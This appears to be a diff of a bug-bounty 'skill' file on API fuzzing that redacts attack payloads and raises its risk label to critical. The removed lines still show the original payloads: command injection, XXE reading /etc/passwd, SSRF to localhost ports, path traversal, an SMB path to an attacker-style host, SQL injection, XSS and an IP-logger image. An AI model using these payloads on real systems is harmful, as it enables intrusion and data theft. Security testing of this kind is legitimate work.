@@ -1,11 +1,14 @@
 ---
 name: api-fuzzing-bug-bounty
 description: "Provide comprehensive techniques for testing REST, SOAP, and GraphQL APIs during bug bounty hunting and penetration testing engagements. Covers vulnerability discovery, authentication bypass, IDOR exploitation, and API-specific attack vectors."
-risk: unknown
+risk: critical
 source: community
 author: zebbern
 date_added: "2026-02-27"
 ---
+> [!WARNING]
+> This skill contains patterns or instructions related to security testing and exploitation. Active payloads have been redacted to ensure safe usage.
+
 
 # API Fuzzing for Bug Bounty
 
@@ -128,23 +131,23 @@ URL?id=<LEGIT>&id=<VICTIM>
 
 ```bash
 # Ruby on Rails
-?url=Kernel#open → ?url=|ls
+?url=Kernel#open → ?url=|[REDACTED-ACTIVE-PAYLOAD]
 
 # Linux command injection
-api.url.com/endpoint?name=file.txt;ls%20/
+api.url.com/endpoint?name=file.txt;[REDACTED-ACTIVE-PAYLOAD]
 ```
 
 **XXE Injection:**
 
 ```xml
-<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "[REDACTED-ACTIVE-PAYLOAD]"> ]>
 ```
 
 **SSRF via API:**
 
 ```html
-<object data="http://127.0.0.1:8443"/>
-<img src="http://127.0.0.1:445"/>
+<object data="[REDACTED-ACTIVE-PAYLOAD]"/>
+<img src="[REDACTED-ACTIVE-PAYLOAD]"/>
 ```
 
 **.NET Path.Combine Vulnerability:**
@@ -153,8 +156,8 @@ api.url.com/endpoint?name=file.txt;ls%20/
 # If .NET app uses Path.Combine(path_1, path_2)
 # Test for path traversal
 https://example.org/download?filename=a.png
-https://example.org/download?filename=C:\inetpub\wwwroot\web.config
-https://example.org/download?filename=\\smb.dns.attacker.com\a.png
+https://example.org/download?filename=[REDACTED-ACTIVE-PAYLOAD]
+https://example.org/download?filename=[REDACTED-ACTIVE-PAYLOAD]
 ```
 
 ### Step 5: Method Testing
@@ -207,7 +210,7 @@ query {
 ```graphql
 mutation {
   login(input: {
-    email: "test' or 1=1--"
+    email: "[REDACTED-ACTIVE-PAYLOAD]"
     password: "password"
   }) {
     success
@@ -248,10 +251,10 @@ query {
 
 ```bash
 # XSS via GraphQL endpoint
-http://target.com/graphql?query={user(name:"<script>alert(1)</script>"){id}}
+http://target.com/graphql?query={user(name:"[REDACTED-ACTIVE-PAYLOAD]"){id}}
 
 # URL-encoded XSS
-http://target.com/example?id=%C/script%E%Cscript%Ealert('XSS')%C/script%E
+http://target.com/example?id=[REDACTED-ACTIVE-PAYLOAD]
 ```
 
 ### GraphQL Tools
@@ -294,16 +297,16 @@ When receiving 403/401, try these bypasses:
 
 ```html
 <!-- LFI via PDF export -->
-<iframe src="file:///etc/passwd" height=1000 width=800>
+<iframe src="[REDACTED-ACTIVE-PAYLOAD]" height=1000 width=800>
 
 <!-- SSRF via PDF export -->
-<object data="http://127.0.0.1:8443"/>
+<object data="[REDACTED-ACTIVE-PAYLOAD]"/>
 
 <!-- Port scanning -->
-<img src="http://127.0.0.1:445"/>
+<img src="[REDACTED-ACTIVE-PAYLOAD]"/>
 
 <!-- IP disclosure -->
-<img src="https://iplogger.com/yourcode.gif"/>
+<img src="[REDACTED-ACTIVE-PAYLOAD]"/>
 ```
 
 ### DoS via Limits
